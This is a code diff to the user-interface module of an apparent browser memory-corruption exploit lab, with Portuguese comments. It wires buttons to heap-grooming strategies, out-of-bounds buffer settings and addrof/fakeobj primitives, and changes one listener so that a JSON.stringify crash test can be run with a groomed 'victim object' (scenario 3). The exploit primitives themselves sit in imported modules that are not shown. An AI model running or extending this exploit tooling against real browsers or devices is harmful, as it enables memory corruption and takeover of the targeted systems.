@@ -5,7 +5,7 @@ import * as Core from './core_exploit.mjs';
 import * as Groomer from './heap_groomer.mjs';
 import * as Corruptor from './victim_corruptor.mjs';
 import * as PostExploit from './post_exploit_conceptual.mjs';
-import * as JsonExploitTest from './json_exploit_test.mjs'; // <<< NOVO IMPORT
+import * as JsonExploitTest from './json_exploit_test.mjs';
 import { updateOOBConfigFromUI as updateGlobalOOBConfig } from './config.mjs';
 
 let uiInitialized = false;
@@ -14,7 +14,6 @@ const App = {
     exploitSuccessfulThisSession: false,
     isCurrentlyRunningStrategies: false,
 
-    // ... (runAllGroomingStrategies e updateCurrentTestGapFromScanUIAndTestSingle como antes) ...
     runAllGroomingStrategies: async () => {
         const FNAME_STRAT = "App.runAllGroomingStrategies";
         const runId = Math.random().toString(16).slice(2,10);
@@ -199,7 +198,35 @@ const App = {
         document.getElementById('btnSetupAddrofConceptual')?.addEventListener('click', PostExploit.setup_addrof_fakeobj_pair_conceptual);
         document.getElementById('btnTestAddrofConceptual')?.addEventListener('click', PostExploit.test_addrof_conceptual);
         document.getElementById('btnTestFakeobjConceptual')?.addEventListener('click', PostExploit.test_fakeobj_conceptual);
-        document.getElementById('btnTestJsonStringify')?.addEventListener('click', JsonExploitTest.attemptJsonStringifyCrash); // <<< NOVO LISTENER
+        
+        // MODIFICADO: Listener para o botão de teste JSON
+        document.getElementById('btnTestJsonStringify')?.addEventListener('click', async () => {
+            const scenarioSelect = document.getElementById('jsonScenarioSelect');
+            const selectedScenario = scenarioSelect ? scenarioSelect.value : 'fallback';
+            appLog(`Iniciando Teste JSON com cenário: ${selectedScenario}`, 'tool', 'App.JsonTestSetup');
+
+            let objectToPass = {
+                description: `Teste com cenário ${selectedScenario}`,
+                default_data: "algum_valor_contextual_app"
+            };
+
+            // Se o cenário 3 for escolhido, tentamos passar o objeto vítima
+            if (selectedScenario === 'scenario3') {
+                if (Groomer.victim_object) {
+                    appLog("Cenário 3: Incluindo OBJETO VÍTIMA no teste JSON.", "tool", "App.JsonTestSetup");
+                    objectToPass.controlled_victim = Groomer.victim_object;
+                    // Exemplo de como adicionar mais dados relevantes ao objeto serializado:
+                    // objectToPass.oob_buffer_ref_example = Core.oob_array_buffer_real; // Cuidado com referências diretas a ArrayBuffers grandes
+                } else {
+                    appLog("Cenário 3: Objeto vítima não preparado! Testando com dados padrão.", "warn", "App.JsonTestSetup");
+                }
+            }
+            // Futuramente, você pode adicionar inputs no HTML para pegar `customParams` e passá-los aqui:
+            // const customParams = { keyLength: ..., valueLength: ... };
+            // await JsonExploitTest.attemptJsonStringifyCrash(objectToPass, selectedScenario, customParams);
+
+            await JsonExploitTest.attemptJsonStringifyCrash(objectToPass, selectedScenario);
+        });
 
         document.getElementById('oobAllocSize')?.addEventListener('change', updateGlobalOOBConfig);
         document.getElementById('baseOffset')?.addEventListener('change', updateGlobalOOBConfig);
@@ -220,7 +247,7 @@ const App = {
             btnRunStrategies.disabled = false;
             btnRunStrategies.textContent = "Executar Todas Estratégias de Grooming & Busca de GAP";
         }
-        appLog("Laboratório Modularizado (v2.8.6 - Teste JSON Integrado) pronto.", "good", "App.Init"); // Versão atualizada
+        appLog("Laboratório Modularizado (v2.8.7 - Seleção de Cenário JSON) pronto.", "good", "App.Init");
         const addrofGapEl = document.getElementById('addrofGap');
         if (addrofGapEl) addrofGapEl.value = "";
         uiInitialized = true;
